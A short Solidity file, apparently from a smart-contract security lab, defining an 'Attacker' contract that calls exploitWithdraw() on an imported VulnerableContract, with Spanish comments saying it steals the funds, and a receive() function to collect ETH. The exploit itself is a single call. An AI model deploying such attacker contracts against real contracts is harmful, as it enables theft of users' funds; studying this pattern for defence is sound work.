// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./VulnerableContract.sol";

contract Attacker {
    VulnerableContract public vulnerableContract;

    constructor(address _vulnerableAddress) {
        vulnerableContract = VulnerableContract(_vulnerableAddress);
    }

    // Esta función explotará la vulnerabilidad en el contrato vulnerable
    function attack() public {
        // El atacante llama a la función explotable para robar los fondos
        vulnerableContract.exploitWithdraw();
    }

    // Función para recibir ETH
    receive() external payable {}
}
